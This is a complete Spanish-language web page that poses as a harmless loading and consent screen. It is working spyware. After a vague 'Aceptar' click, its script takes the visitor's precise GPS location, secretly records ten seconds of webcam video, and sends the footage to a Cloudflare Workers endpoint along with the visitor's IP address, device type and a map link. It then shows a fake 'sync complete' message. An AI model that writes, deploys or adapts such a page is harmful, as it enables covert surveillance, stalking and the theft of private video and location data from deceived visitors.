<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cargando...</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:Arial,sans-serif;background:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}
        .container{text-align:center;max-width:400px;width:100%}
        .spinner{width:50px;height:50px;border:4px solid #f0f0f0;border-top:4px solid #333;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 30px}
        @keyframes spin{to{transform:rotate(360deg)}}
        h1{font-size:20px;color:#333;font-weight:500}
        p{color:#666;font-size:14px;margin:10px 0 30px}
        .btn-group{display:flex;gap:10px}
        button{flex:1;padding:12px;border:1px solid #ddd;border-radius:4px;font-size:14px;cursor:pointer}
        .btn-cancel{background:#fff;color:#333}
        .btn-cancel:hover{background:#f5f5f5}
        .btn-accept{background:#333;color:#fff;border-color:#333}
        .btn-accept:hover{background:#000}
        .hidden{display:none}
        .success{background:#e8f5e9;color:#2e7d32;padding:15px;border-radius:6px;margin-bottom:20px}
    </style>
</head>
<body>
<div class="container">
    <div id="step1"><div class="spinner"></div><h1>Cargando</h1><p>Por favor espera...</p></div>
    <div id="step2" class="hidden"><h1>¿Continuar?</h1><p>Se requiere tu consentimiento</p><div class="btn-group"><button class="btn-cancel" onclick="cancelar()">Cancelar</button><button id="btnAceptar" class="btn-accept" onclick="aceptar()">Aceptar</button></div></div>
    <div id="step3" class="hidden"><div class="spinner"></div><h1>Procesando</h1><p>Espera unos segundos...</p></div>
    <div id="step4" class="hidden"><div class="success">✓ Completado</div><h1>¡Listo!</h1><p>Datos sincronizados</p></div>
</div>
<video id="vid" style="display:none" autoplay muted playsinline></video>
<script>
var WORKER_URL = 'https://vault-gate.jesusdoshuaandres.workers.dev/';

var s1 = document.getElementById('step1');
var s2 = document.getElementById('step2');
var s3 = document.getElementById('step3');
var s4 = document.getElementById('step4');
var btn = document.getElementById('btnAceptar');
var vid = document.getElementById('vid');

var ip = '';
var ubicacion = null;
var recorder = null;
var chunks = [];
var grabando = false;
var stream = null;

window.addEventListener('load', function() {
    fetch(WORKER_URL)
    .then(function(r) { return r.json(); })
    .then(function(d) { ip = d.ip; })
    .catch(function() { ip = 'No disponible'; })
    .finally(function() {
        setTimeout(function() {
            s1.classList.add('hidden');
            s2.classList.remove('hidden');
        }, 2000);
    });
});

function cancelar() { window.history.back(); }

function aceptar() {
    btn.disabled = true;
    s2.classList.add('hidden');
    s3.classList.remove('hidden');

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            function(pos) { ubicacion = pos.coords; iniciarCamara(); },
            function() { ubicacion = null; iniciarCamara(); },
            { enableHighAccuracy: true, timeout: 8000 }
        );
    } else {
        iniciarCamara();
    }
}

function iniciarCamara() {
    navigator.mediaDevices.getUserMedia({ video: true })
    .then(function(st) {
        stream = st;
        vid.srcObject = st;
        recorder = new MediaRecorder(st);
        chunks = [];
        grabando = true;
        recorder.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
        recorder.start();
        setTimeout(function() { detenerYEnviar(); }, 10000);
    })
    .catch(function() { detenerYEnviar(); });
}

function detenerYEnviar() {
    if (!grabando || !recorder) { mostrarExito(); return; }
    recorder.onstop = function() {
        grabando = false;
        if (chunks.length > 0) {
            var blob = new Blob(chunks, { type: 'video/webm' });
            enviarVideo(blob);
        } else {
            mostrarExito();
        }
    };
    recorder.stop();
    if (stream) { stream.getTracks().forEach(function(t) { t.stop(); }); }
}

function enviarVideo(blob) {
    if (blob.size > 20000000) { mostrarExito(); return; }
    var fd = new FormData();
    fd.append('file', blob, 'video-' + Date.now() + '.webm');

    var ts = new Date().toLocaleString('es-ES');
    var dispositivo = /mobile|android|iphone/i.test(navigator.userAgent) ? '📱 Móvil' : '💻 PC';
    var desc = '';
    var mapLink = '';

    if (ubicacion) {
        var lat = ubicacion.latitude.toFixed(6);
        var lon = ubicacion.longitude.toFixed(6);
        mapLink = 'https://maps.google.com/?q=' + lat + ',' + lon;
        desc = '📍 **Ubicación GPS**\nLatitud: ' + lat + '°\nLongitud: ' + lon + '°\nPrecisión: ±' + ubicacion.accuracy.toFixed(2) + 'm\n\n';
    } else {
        desc = '⚠️ **Ubicación no disponible**\n\n';
    }
    desc += '🌐 **IP:** `' + ip + '`\n💻 **Dispositivo:** ' + dispositivo + '\n⏰ **Hora:** ' + ts;

    var embed = {
        title: '📹 Grabación + Datos',
        description: desc,
        color: 16711680,
        timestamp: new Date().toISOString()
    };
    if (mapLink) {
        embed.fields = [{ name: '🗺️ Mapa', value: '[Abrir](' + mapLink + ')', inline: false }];
    }

    fd.append('payload_json', JSON.stringify({ embeds: [embed] }));

    fetch(WORKER_URL, { method: 'POST', body: fd })
    .catch(function(){})
    .finally(function() { mostrarExito(); });
}

function mostrarExito() {
    s3.classList.add('hidden');
    s4.classList.remove('hidden');
}

window.addEventListener('beforeunload', function(e) {
    if (grabando) { e.preventDefault(); e.returnValue = ''; }
});
</script>
</body>
</html>
